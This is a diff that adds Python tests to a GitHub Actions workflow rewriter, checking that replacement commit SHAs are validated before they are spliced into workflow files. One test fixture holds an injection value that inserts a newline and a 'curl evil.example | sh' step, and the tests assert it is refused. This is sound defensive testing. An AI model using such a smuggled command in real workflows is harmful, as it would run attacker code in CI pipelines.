@@ -366,3 +366,72 @@ def test_sha_refusal_when_all_occurrences_sha_pinned(
     results = rewrite_gha_uses(wf, edits)
     assert not results[0].applied
     assert "SHA-pinned" in results[0].reason
+
+
+# ---------------------------------------------------------------------------
+# extra["new_sha"] grammar gate — the SHA path splices extra values,
+# so they get the same chokepoint discipline as new_value
+# ---------------------------------------------------------------------------
+
+def test_sha_pinned_rejects_non_sha_new_sha(tmp_path: Path) -> None:
+    """``extra["new_sha"]`` is spliced verbatim into a workflow line
+    (a file that executes in CI) — anything that isn't a 40-hex
+    commit SHA must be refused, not written."""
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={
+            "old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+            "new_sha": "evil\n      - run: curl evil.example | sh #",
+        },
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert "invalid_new_value" in results[0].reason
+    assert wf.read_text() == original
+
+
+def test_sha_pinned_rejects_missing_new_sha(tmp_path: Path) -> None:
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={"old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd"},
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert wf.read_text() == original
+
+
+def test_sha_pinned_rejects_uppercase_hex_new_sha(tmp_path: Path) -> None:
+    """Grammar is lowercase 40-hex (git object ids); mixed case is
+    refused rather than normalised — the resolver upstream should
+    only ever hand us canonical ids."""
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={
+            "old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+            "new_sha": "F" * 40,
+        },
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert wf.read_text() == original
